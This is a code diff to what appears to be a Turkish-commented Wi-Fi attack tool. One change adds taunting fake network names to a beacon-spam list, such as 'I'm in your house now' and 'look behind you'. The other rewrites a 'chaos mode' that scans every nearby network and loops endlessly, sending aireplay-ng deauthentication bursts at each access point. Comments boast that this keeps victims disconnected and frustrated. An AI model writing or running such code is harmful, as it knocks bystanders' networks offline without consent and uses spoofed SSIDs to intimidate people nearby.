@@ -69,8 +69,11 @@ def beacon_spam(iface):
                 "FBI Surveillance Van", 
                 "Bedava İnternet (VIRUSLU)", 
                 "Senin Wi-Fi Artik Benim", 
-                "Baglan da Hacklen", 
+                "Senin değil bizim wifimiz"
                 "Kacinci Katta Oturuyorsun",
+                "Şuan evinin içindeyim :)",
+                "Arkana bak",
+                "Yan odadayımmmm",
                 "TurkTelekom_5G_Test",
                 "Superonline_GUEST"
             ]
@@ -89,21 +92,46 @@ def beacon_spam(iface):
         print("\n    [✘] Hata: 'mdk3' aracı eksik olabilir. (Terminalde: sudo apt install mdk3 yazarak kur)")
 
 # ==========================================
-# YENİ: CHAOS MODU (MDK3 AMOK - KANSER ETME)
+# YENİ: CHAOS MODU (OTOMATİK VUR-KAÇ DÖNGÜSÜ)
 # ==========================================
 def chaos_mode(iface):
-    print("\n    \033[91m\033[1m[!] KANSER MODU (MDK3 AMOK) AKTİF EDİLDİ [!]\033[0m")
-    print("    \033[91m[*] MDK3 kanallar arasında ışık hızında zıplıyor...\033[0m")
-    print("    \033[91m[*] Çevredeki tüm ağlarda devasa pingler ve kopmalar yaratılıyor.\033[0m")
+    print("\n    \033[91m\033[1m[!] CHAOS MODU AKTİF EDİLDİ [!]\033[0m")
+    print("    \033[91m[*] Sistem: Etraftaki tüm ağları listeleyecek ve sırayla şok dalgası yollayacak.\033[0m")
+    print("    \033[91m[*] Taktik: Herkese uğrayıp döngüyü başa saracak (Adamlar tam bağlanırken yine düşecek).\033[0m")
     print("    \033[91m[*] (Durdurmak için CTRL+C)\033[0m")
     time.sleep(2)
     
-    # mdk3 d : Deauth/Disassociation Amok Mode (Her şeye saldırır)
-    # -s 1000 : Saniyede 1000 paketlik devasa bir mermi hızı
-    cmd = f"sudo mdk3 {iface} d -s 1000"
-    
     try:
-        # MDK3 tüm kanal gezme ve vurma işini kendisi halleder
-        subprocess.run(cmd, shell=True)
+        # Önce kurban listesini çıkarıyoruz (Döngü dışında bir kere tarasın ki vakit kaybetmeyelim)
+        print("\n    [*] Çevre taranıyor, hedefler belirleniyor... (10 Saniye)")
+        networks = radar.auto_scan_and_select(iface, scan_time=10)
+        
+        if not networks:
+            print("    [!] Etrafta ağ bulunamadı. Lütfen daha sonra tekrar deneyin.")
+            return
+            
+        print(f"    [✔] Toplam {len(networks)} hedef kilitlendi. Zıplama motoru ateşleniyor!\n")
+        time.sleep(1)
+        
+        tur_sayisi = 1
+        while True:
+            print(f"\n    \033[93m--- [ TUR {tur_sayisi} BAŞLADI ] ---\033[0m")
+            
+            for net in networks:
+                # Terminal çok kirlenmesin diye tek satırda bilgi veriyoruz
+                print(f"    [>] Şok Dalgası: {net['essid'][:15]:<15} | Kanal: {net['ch']} | BSSID: {net['bssid']}")
+                
+                # Kartın kanalını hedefin kanalına çevir
+                engine.run_cmd(f"sudo iwconfig {iface} channel {net['ch']}")
+                
+                # 20 adet mermi fırlat (Yaklaşık 2-3 saniye sürer)
+                cmd = f"sudo aireplay-ng -0 20 -a {net['bssid']} {iface}"
+                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                
+            print(f"    \033[93m--- [ TUR {tur_sayisi} BİTTİ - BAŞA SARILIYOR ] ---\033[0m")
+            tur_sayisi += 1
+            # İstersen buraya time.sleep(10) ekleyip tur aralarında bekleme yapabilirsin
+            # Ama hiç beklemeden başa sarmak adamları daha çok çıldırtır :)
+            
     except KeyboardInterrupt:
-        print("\n    \033[92m[✔] Kanser Modu durduruldu. Ortalık sakinleşti.\033[0m")
+        print("\n    \033[92m[✔] Chaos Modu durduruldu. Hava sahası normale döndü.\033[0m")
